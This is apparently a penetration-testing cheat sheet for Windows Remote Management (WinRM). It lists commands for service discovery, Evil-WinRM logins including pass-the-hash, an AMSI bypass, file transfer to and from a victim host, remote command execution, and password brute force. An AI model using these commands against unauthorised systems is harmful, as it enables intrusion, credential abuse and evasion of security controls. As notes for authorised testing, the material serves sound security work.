# WinRM
```table-of-contents
```
## Theory
- **Port 5985:** HTTP (Standard)
- **Port 5986:** HTTPS (Encrypted)
- **Requirement:** Needs valid credentials and the user must be in the `Remote Management Users` or `Administrators` group.
## Discovery
```shell
# Nmap - Version Scan
nmap -p 5985,5986 -sV -sC <IP>

# NetExec (CrackMapExec) - Check Auth
# Useful to verify credentials without logging in
nxc winrm <IP> -u <USER> -p <PASS>
```
## Evil-WinRM (The King)
```shell
# Basic Login (Password)
evil-winrm -i <IP> -u <USER> -p <PASS>

# Login with Hash (Pass-The-Hash)
evil-winrm -i <IP> -u <USER> -H <NTLM_HASH>

# Login with Certificate
evil-winrm -i <IP> -c certificate.pem -k private.key -S
```
### Useful Evil-WinRM Commands
| **Command**                 | **Description**                                       |
| --------------------------- | ----------------------------------------------------- |
| `menu`                      | Shows the available modules.                          |
| `bypass-amsi`               | Disables Windows Defender AMSI (**Run this first!**). |
| `upload <local> <remote>`   | Uploads a file to the victim.                         |
| `download <remote> <local>` | Downloads a file from the victim.                     |
| `services`                  | List running services.                                |
## Remote Execution (Non-Interactive)
```shell
# NetExec - Execute Command
nxc winrm <IP> -u <USER> -p <PASS> -x "whoami"

# NetExec - Enable WinRM
# If you have Admin creds via SMB but WinRM is off
nxc smb <IP> -u <USER> -p <PASS> -M winrm_enable
```
## Brute Force
```shell
# NetExec / CrackMapExec
nxc winrm <IP> -u <USER> -p /path/to/passwords.txt
```